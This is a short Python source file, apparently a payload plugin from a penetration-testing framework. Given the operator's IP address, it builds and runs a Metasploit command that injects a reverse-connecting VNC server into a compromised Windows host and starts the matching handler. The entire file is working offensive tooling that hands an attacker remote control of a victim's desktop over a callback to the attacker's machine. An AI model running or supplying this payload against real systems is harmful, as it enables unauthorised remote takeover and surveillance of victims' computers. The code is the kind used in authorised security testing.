from plugins.attack.payloads.payloads.metasploit import metasploit


class msf_windows_vncinject_reverse(metasploit):
    '''
    This payload creates a reverse VNC server in windows using the metasploit framework.
    '''
    def run_execute(self, parameters):
        
        if len(parameters) != 1:
            return 'Usage: payload msf_windows_vncinject_reverse <your ip address>'
        
        ip_address = parameters[0]
        
        parameters = 'windows/vncinject/reverse_tcp LHOST=%s |'
        parameters += ' exploit/multi/handler PAYLOAD=windows/vncinject/reverse_tcp'
        parameters += ' LHOST=%s E'
        parameters = parameters % (ip_address, ip_address)
        
        parameters = parameters.split(' ')
        
        api_result = self.api_execute(parameters)
        return api_result

